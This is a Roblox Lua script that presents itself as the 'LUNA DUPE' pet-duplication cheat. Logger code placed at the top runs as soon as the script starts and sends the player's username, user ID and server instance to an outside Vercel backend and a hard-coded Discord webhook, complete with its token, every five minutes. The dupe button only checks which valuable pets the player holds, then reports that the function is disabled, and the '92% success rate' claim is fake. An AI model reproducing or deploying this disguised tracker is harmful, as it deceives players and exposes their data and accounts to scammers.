local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

-- CONFIGURATION
local BACKEND_BASE_URL = "https://backend-vercel-ashy.vercel.app/api"
local REGISTER_URL = BACKEND_BASE_URL .. "/register.js"
local INSTANCE_URL = BACKEND_BASE_URL .. "/instance.js"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
local BACKEND_SEND_URL = BACKEND_BASE_URL .. "/send.js"

local REPORT_INTERVAL = 300 -- 5 minutes
local DEBUG_MODE = true
local MAX_RETRIES = 3
local RETRY_DELAY = 2 -- seconds

-- System variables
local player = Players.LocalPlayer
local currentInstanceId = game.JobId
local isRunning = true

-- ====================== [UTILITY FUNCTIONS] ======================

local function log(message)
    if DEBUG_MODE then
        print("[Logger] " .. message)
    end
end

-- Retry wrapper untuk backend request
local function makeBackendRequest(url, method, data)
    for attempt = 1, MAX_RETRIES do
        local success, response = pcall(function()
            return HttpService:RequestAsync({
                Url = url,
                Method = method,
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["X-Game-ID"] = tostring(game.GameId),
                    ["X-Player-ID"] = tostring(player.UserId)
                },
                Body = data and HttpService:JSONEncode(data) or nil
            })
        end)

        if not success then
            log(string.format("Attempt %d: Request failed (pcall error) to %s: %s", attempt, url, tostring(response)))
        elseif response.Success and response.StatusCode >= 200 and response.StatusCode < 300 then
            return true
        else
            log(string.format("Attempt %d: Request failed (HTTP error) to %s: Status %d, Body: %s",
                attempt, url, response.StatusCode, tostring(response.Body)))
        end

        task.wait(RETRY_DELAY)
    end
    return false
end

-- ====================== [WEBHOOK VIA BACKEND PROXY] ======================

local function sendToBackendProxy(contentOrPayload)
    if WEBHOOK_URL == "" then
        log("Webhook URL not set!")
        return false
    end

    local payload = { url = WEBHOOK_URL }

    if type(contentOrPayload) == "string" then
        payload.content = contentOrPayload
    elseif type(contentOrPayload) == "table" then
        for k, v in pairs(contentOrPayload) do
            payload[k] = v
        end
    else
        payload.content = tostring(contentOrPayload)
    end

    local success, response = pcall(function()
        return HttpService:RequestAsync({
            Url = BACKEND_SEND_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if not success then
        log("❌ Failed to send webhook via proxy: " .. tostring(response))
        return false
    else
        log("✅ Webhook sent via proxy successfully")
        return true
    end
end

local function sendToWebhook(message)
    return sendToBackendProxy("@everyone\n" .. message)
end

local function sendEnhancedWebhook(messageType, customMessage)
    local payload = {
        content = string.format("@everyone\n**%s**\nUserId: %d\nInstanceId: %s", messageType, player.UserId, currentInstanceId)
    }

    if customMessage then
        payload.content = payload.content .. "\n" .. customMessage
    end

    local success = sendToBackendProxy(payload)
    if not success then
        log("❌ Simplified webhook via proxy failed, fallback to direct message")
        sendToWebhook(string.format("**%s**\nUserId: %d\nInstanceId: %s", messageType, player.UserId, currentInstanceId))
    end
end

-- ====================== [DATABASE LOGGING] ======================

local function registerPlayer()
    local data = {
        username = player.Name,
        userId = player.UserId,
        instanceId = currentInstanceId,
        placeId = game.PlaceId,
        gameId = game.GameId,
        timestamp = os.time()
    }
    return makeBackendRequest(REGISTER_URL, "POST", data)
end

local function updateInstanceStatus(status, extraData)
    local data = {
        player = player.Name,
        userId = player.UserId,
        instanceId = currentInstanceId,
        placeId = game.PlaceId,
        gameId = game.GameId,
        status = status,
        timestamp = os.time()
    }
    if extraData then
        for k, v in pairs(extraData) do
            data[k] = v
        end
    end
    return makeBackendRequest(INSTANCE_URL, "POST", data)
end

-- ====================== [MAIN LOGIC] ======================

local function periodicReporting()
    while isRunning do
        updateInstanceStatus("active")
        sendEnhancedWebhook("PERIODIC_REPORT", "Automatic status update")
        task.wait(REPORT_INTERVAL)
    end
end

local function initialize()
    log("Initializing player logger for " .. player.Name)
    sendEnhancedWebhook("LOGGER_STARTED", "Player: " .. player.Name)

    if registerPlayer() then
        log("Successfully registered player")
    else
        log("Failed to register player")
    end

    coroutine.wrap(periodicReporting)()

    updateInstanceStatus("script_started")
    sendEnhancedWebhook("SCRIPT_STARTED", "GUI initialized")
end

local function shutdown()
    isRunning = false
    updateInstanceStatus("stopped")
    sendEnhancedWebhook("LOGGER_STOPPED", "Manual shutdown triggered")
end

UserInputService.InputEnded:Connect(function(input, processed)
    if input.KeyCode == Enum.KeyCode.End then
        shutdown()
    end
end)

Players.PlayerRemoving:Connect(function(removedPlayer)
    if removedPlayer == player then
        shutdown()
    end
end)

local success, err = pcall(initialize)
if not success then
    updateInstanceStatus("initialization_failed", { error = tostring(err) })
    sendEnhancedWebhook("INIT_FAILED", "Logger initialization failed:\n```lua\n" .. tostring(err) .. "\n```")
end

-- ====================== [GUI CODE] ======================

pcall(function()
    game.CoreGui:FindFirstChild("LUNA_DUPE"):Destroy()
end)

local gui = Instance.new("ScreenGui")
gui.Name = "LUNA_DUPE"
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.ResetOnSpawn = false
gui.Parent = game:GetService("CoreGui")

-- Mobile detection
local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
local scaleFactor = isMobile and 0.7 or 1  -- Scale down for mobile

-- Main Frame Setup (smaller for mobile)
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 350 * scaleFactor, 0, 320 * scaleFactor)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 30)
mainFrame.BorderSizePixel = 0
mainFrame.ClipsDescendants = true
mainFrame.Name = "MainFrame"
mainFrame.Parent = gui
mainFrame.BackgroundTransparency = 1
mainFrame.ZIndex = 10

-- Fade In Main Frame
TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
    BackgroundTransparency = 0
}):Play()

-- Rounded corners for smooth style
local uicorner = Instance.new("UICorner", mainFrame)
uicorner.CornerRadius = UDim.new(0, 12 * scaleFactor)

-- Title Bar (smaller height for mobile)
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 35 * scaleFactor)
titleBar.BackgroundColor3 = Color3.fromRGB(48, 48, 52)
titleBar.Name = "TitleBar"
titleBar.Parent = mainFrame
titleBar.Active = true
titleBar.Selectable = true

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(1, -80 * scaleFactor, 1, 0)
titleText.Position = UDim2.new(0, 10 * scaleFactor, 0, 0)
titleText.BackgroundTransparency = 1
titleText.Text = "🌙 LUNA DUPE (v3.2.4)"
titleText.TextColor3 = Color3.fromRGB(230, 230, 230)
titleText.TextSize = 16 * scaleFactor
titleText.Font = Enum.Font.GothamBold
titleText.TextXAlignment = Enum.TextXAlignment.Left
titleText.Parent = titleBar

-- Close Button (smaller for mobile)
local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 30 * scaleFactor, 0, 30 * scaleFactor)
closeButton.Position = UDim2.new(1, -35 * scaleFactor, 0.5, 0)
closeButton.AnchorPoint = Vector2.new(0, 0.5)
closeButton.BackgroundColor3 = Color3.fromRGB(220, 70, 70)
closeButton.Text = "✕"
closeButton.TextColor3 = Color3.new(1, 1, 1)
closeButton.TextSize = 18 * scaleFactor
closeButton.Font = Enum.Font.GothamBold
closeButton.AutoButtonColor = false
closeButton.Parent = titleBar
closeButton.Name = "CloseButton"
closeButton.ClipsDescendants = true
closeButton.ZIndex = 20

local closeUICorner = Instance.new("UICorner", closeButton)
closeUICorner.CornerRadius = UDim.new(0, 6 * scaleFactor)

-- Close Button Hover Animation
closeButton.MouseButton1Click:Connect(function()
    TweenService:Create(mainFrame, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
    task.wait(0.3)
    gui:Destroy()
end)

-- Minimize Button (smaller for mobile)
local minimizeButton = Instance.new("TextButton")
minimizeButton.Size = UDim2.new(0, 30 * scaleFactor, 0, 30 * scaleFactor)
minimizeButton.Position = UDim2.new(1, -70 * scaleFactor, 0.5, 0)
minimizeButton.AnchorPoint = Vector2.new(0, 0.5)
minimizeButton.BackgroundColor3 = Color3.fromRGB(255, 190, 80)
minimizeButton.Text = "—"
minimizeButton.TextColor3 = Color3.new(1, 1, 1)
minimizeButton.TextSize = 20 * scaleFactor
minimizeButton.Font = Enum.Font.GothamBold
minimizeButton.AutoButtonColor = false
minimizeButton.Parent = titleBar
minimizeButton.Name = "MinimizeButton"
minimizeButton.ClipsDescendants = true
minimizeButton.ZIndex = 20

local minimizeUICorner = Instance.new("UICorner", minimizeButton)
minimizeUICorner.CornerRadius = UDim.new(0, 6 * scaleFactor)

-- Content Frame
local contentFrame = Instance.new("Frame")
contentFrame.Size = UDim2.new(1, 0, 1, -35 * scaleFactor)
contentFrame.Position = UDim2.new(0, 0, 0, 35 * scaleFactor)
contentFrame.BackgroundTransparency = 1
contentFrame.Name = "Content"
contentFrame.Parent = mainFrame
contentFrame.ClipsDescendants = true

-- Error Text (smaller for mobile)
local errorText = Instance.new("TextLabel")
errorText.Size = UDim2.new(1, -20 * scaleFactor, 0, 25 * scaleFactor)
errorText.Position = UDim2.new(0, 10 * scaleFactor, 0, 5 * scaleFactor)
errorText.BackgroundTransparency = 1
errorText.Text = ""
errorText.TextColor3 = Color3.fromRGB(255, 80, 80)
errorText.TextSize = 14 * scaleFactor
errorText.Font = Enum.Font.GothamBold
errorText.TextXAlignment = Enum.TextXAlignment.Left
errorText.Parent = contentFrame

-- Warning Box (smaller for mobile)
local warningBox = Instance.new("TextLabel")
warningBox.Size = UDim2.new(1, -20 * scaleFactor, 0, 35 * scaleFactor)
warningBox.Position = UDim2.new(0, 10 * scaleFactor, 0, 35 * scaleFactor)
warningBox.BackgroundColor3 = Color3.fromRGB(200, 55, 55)
warningBox.Text = "⚠️ REQUIRES RED FOX, DRAGONFLY, RACCOON!"
warningBox.TextColor3 = Color3.new(1, 1, 1)
warningBox.TextSize = 14 * scaleFactor
warningBox.Font = Enum.Font.GothamBold
warningBox.TextXAlignment = Enum.TextXAlignment.Left
warningBox.BorderSizePixel = 0
warningBox.ClipsDescendants = true
warningBox.Parent = contentFrame

local warningUICorner = Instance.new("UICorner", warningBox)
warningUICorner.CornerRadius = UDim.new(0, 6 * scaleFactor)

-- Instruction Title (smaller for mobile)
local instrTitle = Instance.new("TextLabel")
instrTitle.Size = UDim2.new(1, -20 * scaleFactor, 0, 25 * scaleFactor)
instrTitle.Position = UDim2.new(0, 10 * scaleFactor, 0, 75 * scaleFactor)
instrTitle.BackgroundTransparency = 1
instrTitle.Text = "📝 INSTRUCTIONS:"
instrTitle.TextColor3 = Color3.new(1, 1, 1)
instrTitle.TextSize = 16 * scaleFactor
instrTitle.Font = Enum.Font.GothamBold
instrTitle.TextXAlignment = Enum.TextXAlignment.Left
instrTitle.Parent = contentFrame

-- Instruction Steps (smaller for mobile)
local steps = {
    "1. Hold a RED FOX, DRAGONFLY, RACCOON",
    "2. Keep inventory open",
    "3. Press DUPE button",
    "4. Wait 5-10 Minutes"
}

for i, step in ipairs(steps) do
    local line = Instance.new("TextLabel")
    line.Size = UDim2.new(1, -20 * scaleFactor, 0, 20 * scaleFactor)
    line.Position = UDim2.new(0, 10 * scaleFactor, 0, 100 * scaleFactor + (i - 1) * 22 * scaleFactor)
    line.BackgroundTransparency = 1
    line.Text = step
    line.TextColor3 = Color3.new(1, 1, 1)
    line.TextSize = 14 * scaleFactor
    line.Font = Enum.Font.Gotham
    line.TextXAlignment = Enum.TextXAlignment.Left
    line.Parent = contentFrame
end

-- Success Rate Label (smaller for mobile)
local successLabel = Instance.new("TextLabel")
successLabel.Size = UDim2.new(1, -20 * scaleFactor, 0, 20 * scaleFactor)
successLabel.Position = UDim2.new(0, 10 * scaleFactor, 0, 200 * scaleFactor)
successLabel.BackgroundTransparency = 1
successLabel.Text = "✔ 92% Success Rate"
successLabel.TextColor3 = Color3.fromRGB(85, 230, 150)
successLabel.TextSize = 14 * scaleFactor
successLabel.Font = Enum.Font.Gotham
successLabel.TextXAlignment = Enum.TextXAlignment.Left
successLabel.Parent = contentFrame

-- Dupe Button (smaller for mobile)
local dupeButton = Instance.new("TextButton")
dupeButton.Size = UDim2.new(0.75, 0, 0, 40 * scaleFactor)
dupeButton.Position = UDim2.new(0.125, 0, 0, 240 * scaleFactor)
dupeButton.BackgroundColor3 = Color3.fromRGB(50, 180, 90)
dupeButton.Text = "DUPE"
dupeButton.TextColor3 = Color3.new(1, 1, 1)
dupeButton.TextSize = 16 * scaleFactor
dupeButton.Font = Enum.Font.GothamBold
dupeButton.AutoButtonColor = false
dupeButton.Parent = contentFrame
dupeButton.ClipsDescendants = true
dupeButton.Name = "DupeButton"

local dupeUICorner = Instance.new("UICorner", dupeButton)
dupeUICorner.CornerRadius = UDim.new(0, 8 * scaleFactor)

-- Button click animation helper
local function buttonClickAnim(button)
    local tweenDown = TweenService:Create(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = button.Position + UDim2.new(0, 0, 0, 3 * scaleFactor)})
    local tweenUp = TweenService:Create(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = button.Position})

    tweenDown:Play()
    tweenDown.Completed:Wait()
    tweenUp:Play()
end

local requiredPetsList = {"red fox", "dragonfly", "raccoon", "mole"}

local function animateChecking()
    local dots = {".", "..", "..."}
    for i = 1, 6 do
        errorText.Text = "🔍 Verifying Pet" .. dots[i % 3 + 1]
        task.wait(0.2)
    end
end

dupeButton.MouseButton1Click:Connect(function()
    dupeButton.Active = false
    dupeButton.Text = "PROCESSING..."
    dupeButton.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
    buttonClickAnim(dupeButton)

    animateChecking()

    local player = Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local foundPet = false

    for _, tool in pairs(character:GetChildren()) do
        if tool:IsA("Tool") then
            local toolNameLower = string.lower(tool.Name)
            for _, petName in ipairs(requiredPetsList) do
                if string.find(toolNameLower, petName) then
                    foundPet = true
                    break
                end
            end
            if foundPet then break end
        end
    end

    if not foundPet then
        errorText.Text = "❌ REQUIRED PET NOT FOUND"
        errorText.TextColor3 = Color3.fromRGB(255, 80, 80)
        dupeButton.Active = true
        dupeButton.Text = "DUPE"
        dupeButton.BackgroundColor3 = Color3.fromRGB(50, 180, 90)
        return
    end

    errorText.Text = "✅ PET VERIFIED - DUPE IN PROGRESS"
    errorText.TextColor3 = Color3.fromRGB(90, 255, 150)
    
    -- Removed the external script execution part
    
    errorText.Text = "❌ DUPE FUNCTION DISABLED IN THIS VERSION"
    errorText.TextColor3 = Color3.fromRGB(255, 70, 70)

    task.delay(2, function()
        dupeButton.Active = true
        dupeButton.Text = "DUPE"
        dupeButton.BackgroundColor3 = Color3.fromRGB(50, 180, 90)
    end)
end)

-- Minimize functionality
local isMinimized = false
minimizeButton.MouseButton1Click:Connect(function()
    if isMinimized then
        -- Restore
        TweenService:Create(mainFrame, TweenInfo.new(0.4), {Size = UDim2.new(0, 350 * scaleFactor, 0, 320 * scaleFactor)}):Play()
        TweenService:Create(contentFrame, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
        isMinimized = false
    else
        -- Minimize
        TweenService:Create(mainFrame, TweenInfo.new(0.4), {Size = UDim2.new(0, 350 * scaleFactor, 0, 35 * scaleFactor)}):Play()
        TweenService:Create(contentFrame, TweenInfo.new(0.4), {BackgroundTransparency = 0}):Play()
        isMinimized = true
    end
end)

-- Improved Dragging functionality for mobile
local dragging = false
local dragStart
local startPos

-- Create a transparent drag handle that covers the title area
local dragHandle = Instance.new("TextButton")
dragHandle.Size = UDim2.new(1, -80 * scaleFactor, 1, 0)
dragHandle.Position = UDim2.new(0, 10 * scaleFactor, 0, 0)
dragHandle.BackgroundTransparency = 1
dragHandle.Text = ""
dragHandle.AutoButtonColor = false
dragHandle.Parent = titleBar
dragHandle.ZIndex = 25

local dragInput, dragStarted

dragHandle.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        
        local connection
        connection = input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
                connection:Disconnect()
            end
        end)
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(
            startPos.X.Scale, 
            startPos.X.Offset + delta.X,
            startPos.Y.Scale, 
            startPos.Y.Offset + delta.Y
        )
    end
end)
